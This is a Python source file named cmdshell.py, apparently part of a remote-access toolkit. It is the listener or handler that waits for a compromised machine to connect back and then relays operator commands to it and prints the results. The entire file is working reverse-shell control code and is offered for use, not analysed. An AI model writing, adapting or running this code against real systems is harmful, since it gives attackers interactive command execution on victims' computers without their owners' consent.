# -*- coding:utf-8 -*-
# @FileName  :cmdshell.py
# @Time      :2022/11/08 18:19:18
# @Author    :D0WE1L1N
import socket
import sys
import time
try:
    import handler
except:
    pass
def start(ip, port):
    if port == "":
        port = 8625
    if ip == "":
        ip = "127.0.0.1"
    else:
        try:
            port = int(port)
        except:
            print("handler>[-]port input error")
    try:
        cmd_session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cmd_session.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        cmd_session.bind((ip, port))
        cmd_session.listen(10)
    except socket.error as msg:
        print("handler>[-]something went WRONG, print out the wrong msg: " + str(msg))
        sys.exit(1)
    while True:
        cmd_SessObj,CMDIP = cmd_session.accept()
        while True:
            cmd_command = input("CMD_SHELL>")
            cmd_SessObj.send(bytes(cmd_command, 'utf8'))
            if cmd_command == "exit":
                print("CMD_SHELL>[*]exiting......")
                time.sleep(2)
                handler.startserver(ip, port, False, False)
            CMD_re = cmd_SessObj.recv(1024)
            try:
                print(str(ip) + ">"+ CMD_re.decode('utf-8'))
            except:
                print(str(ip) + ">" + CMD_re.decode('gbk'))
        cmd_SessObj.close()
        break
    cmd_session.close()
    
if __name__ == "__main__":
    start("192.168.140.1", 8625)
